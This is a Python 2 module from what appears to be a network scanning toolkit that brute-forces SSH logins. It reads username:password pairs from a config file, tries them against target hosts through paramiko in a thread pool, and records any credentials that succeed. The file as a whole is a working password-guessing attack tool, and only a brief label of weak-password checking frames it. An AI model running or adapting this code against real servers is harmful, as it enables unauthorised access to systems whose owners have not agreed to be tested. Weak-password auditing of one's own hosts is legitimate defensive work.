# coding=utf-8 author:wilson
import time
import threading
from multiprocessing.dummy import Pool
from comm.printers import printGreen, printRed

try:
    import paramiko

    isinstall = True
except:
    isinstall = False


class ssh_burp(object):
    def __init__(self, c):
        self.config = c
        self.lock = threading.Lock()
        self.result = []
        self.lines = self.config.file2list("conf/ssh.conf")

    def ssh_connect(self, ip, username, password, port):
        '''
        连接ssh 安装了库就用库
        :param ip:
        :param username:
        :param password:
        :param port:
        :return:
        '''
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port, username=username, password=password,timeout=8)
            return 1
        except Exception, e:
            if e[0] == 'Authentication failed.':
                return 0
            else:
                return 2
        finally:
            client.close()


    def ssh_l(self, ip, port):
        try:
            for data in self.lines:
                username = data.split(':')[0]
                password = data.split(':')[1]
                flag = self.ssh_connect(ip, username, password, port)
                if flag == 2:
                    self.lock.acquire()
                    print "[!] connect %s ssh service at %s login fail " % (ip, port)
                    self.lock.release()
                    break
                elif flag == 1:
                    self.lock.acquire()
                    printGreen(
                        "[+] %s ssh at %s has weaken password!!-------%s:%s\r\n" % (ip, port, username, password))
                    self.result.append(
                        "[+] %s ssh at %s has weaken password!!-------%s:%s\r\n" % (ip, port, username, password))
                    self.lock.release()
                    break
                elif flag == 0:
                    self.lock.acquire()
                    print "[*] %s ssh service 's %s:%s login fail " % (ip, username, password)
                    self.lock.release()
        except Exception, e:
            print "[!] err:%s" % e
            pass


    def run(self, ipdict, pinglist, threads, file):
        if isinstall == False:
            printRed("[!] 抱歉没有安装paramiko库，所以ssh模块无效，如果你要爆破ssh弱口令，需要安装 paramiko 1.15.2")
            return

        if len(ipdict['ssh']):
            print "[*] crack ssh  now..."
            print "[*] start crack ssh  %s" % time.ctime()
            starttime = time.time()

            pool = Pool(threads)

            for ip in ipdict['ssh']:
                pool.apply_async(func=self.ssh_l, args=(str(ip).split(':')[0], int(str(ip).split(':')[1])))

            pool.close()
            pool.join()

            print "[*] stop ssh serice  %s" % time.ctime()
            print "[*] crack ssh done,it has Elapsed time:%s " % (time.time() - starttime)

            for i in xrange(len(self.result)):
                self.config.write_file(contents=self.result[i], file=file)


if __name__ == '__main__':
    import sys

    sys.path.append("../")
    from comm.config import *

    c = config()
    ipdict = {'ssh': ['xx:22']}
    pinglist = ['xxx']
    test = ssh_burp(c)
    test.run(ipdict, pinglist, 50, file="../result/test")
